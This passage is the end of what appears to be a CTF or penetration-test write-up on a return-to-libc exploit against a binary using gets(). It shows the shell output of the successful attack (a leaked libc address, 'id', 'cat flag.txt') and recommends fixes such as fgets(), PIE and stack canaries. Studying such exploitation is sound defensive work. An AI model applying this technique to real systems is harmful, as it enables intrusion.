</span><span class="c3">that</span><span class="c1">board meeting was a *smashing* success! rob loved</span> <span class="c3">the</span><span class="c1"> challenge!  
</span><span class="c3">in</span><span class="c1">fact, he loved</span> <span class="c3">it</span><span class="c1">so much he sponsored</span> <span class="c3">me</span><span class="c1">a business trip</span> <span class="c3">to</span><span class="c1"> this place called 'libc'...  
</span><span class="c3">where</span><span class="c1"> </span><span class="c3">is</span><span class="c1">this place? can you help</span> <span class="c3">me</span><span class="c1"> </span><span class="c3">get</span><span class="c1">there safely?  
phew, good</span> <span class="c3">to</span><span class="c1">know. shoot! i forgot!  
rob said i'd need this</span> <span class="c3">to</span><span class="c1"> </span><span class="c3">get</span><span class="c1">there: 7ff17eada560  
good luck!  
$</span> <span class="c3">id</span><span class="c1">  
uid=1000 gid=1000 groups=1000  
$ ls  
flag.txt  
</span><span class="c3">run</span><span class="c1">  
$ cat flag.txt  
flag{ro</span><span class="c1 c20">[REDACTED]</span><span class="c1">sing}</span>

</td>

</tr>

</tbody>

</table>

## <span class="c13"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

<span class="c11"></span>

# <span class="c23">Conclusion</span>

* * *

<span class="c11"></span>

<span class="c11"></span>

<span>The insecure</span> <span class="c9">gets()</span><span class="c11"> function should never be used due to its lack of boundary checks on user input. This can result in the overwriting of memory that can lead to arbitrary code execution. ASLR and enabling the NX bit are not adequate in the prevention of binary exploitation (however they do help mitigate vulnerabilities). The following remediations should be strongly considered to prevent the attack outlined in this report:</span>

<span class="c11"></span>

*   <span>Replace the</span> <span class="c9">gets()</span><span>function with</span> <span class="c9">fgets()</span>

*   <span class="c11">The latter performs boundary checks on user input which mitigates buffer overflow attacks</span>

*   <span class="c11">Implement PIE</span>

*   <span class="c11">Return-to-libc attacks worked by calculating the addresses of the system function and base libc address based on their known offers</span>
*   <span class="c11">By enabling PIE, the known offsets between executables cannot be predicted as they change with each new runtime process</span>

*   <span class="c11">Implement  a stack canary</span>

*   <span class="c11">The stack canary will mitigate buffer overflow attacks by protecting the return pointer</span>

<span class="c11"></span>

<span>Port 31568 should be closed immediately until the current binary is replaced with a more secure version that follows the aforementioned remediations.</span>

<div>

<span class="c42 c27"></span>

</div>

* * *

<div>

[[1]](#ftnt_ref1)<span class="c55"> </span><span class="c29">[https://www.ibm.com/docs/en/i/7.3?topic=functions-setbuf-control-buffering](https://www.google.com/url?q=https://www.ibm.com/docs/en/i/7.3?topic%3Dfunctions-setbuf-control-buffering&sa=D&source=editors&ust=1653835801776239&usg=AOvVaw2Kr4CzuYTkcvm3qTU1hEFS)</span><span class="c34"> </span>

</div>

<div>

[[2]](#ftnt_ref2)<span class="c55"> </span><span class="c29">[https://github.com/Gallopsled/pwntools](https://www.google.com/url?q=https://github.com/Gallopsled/pwntools&sa=D&source=editors&ust=1653835801776525&usg=AOvVaw1NeRIwuFOvEgMn8On4x7JX)</span><span class="c34"> </span>

</div>

<div>

[[3]](#ftnt_ref3)<span class="c55"> </span><span class="c29">[https://trustfoundry.net/basic-rop-techniques-and-tricks/](https://www.google.com/url?q=https://trustfoundry.net/basic-rop-techniques-and-tricks/&sa=D&source=editors&ust=1653835801776751&usg=AOvVaw22HffVwLeijrao67Hy5NRs)</span><span class="c34"> </span>

</div>
